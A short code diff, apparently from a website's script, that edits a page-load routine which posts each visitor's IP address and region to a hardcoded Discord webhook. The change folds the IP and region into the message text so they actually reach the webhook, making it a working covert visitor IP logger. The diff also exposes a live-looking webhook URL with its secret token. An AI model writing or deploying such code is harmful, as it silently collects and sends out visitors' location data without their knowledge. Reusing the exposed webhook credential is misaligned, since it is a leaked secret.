@@ -39,9 +39,7 @@
                 .then(data => {
                     const webhookUrl = 'https://discord.com/api/webhooks/1132724639668392036/mkxKbBil5U3ajV8BGf89CJmqPnRWHKY-ehqJWlgU3izpb3MS2iwNsmtu6MZPo0sH_iDk'; // Replace this with your server endpoint
                     const message = {
-                        content: 'Someone opened the website!',
-                        ip: data.ip,
-                        region: data.region,
+                        content: `Someone opened the website. IP: ${data.ip}, Region: ${data.region}.`,
                     };
 
                     fetch(webhookUrl, {
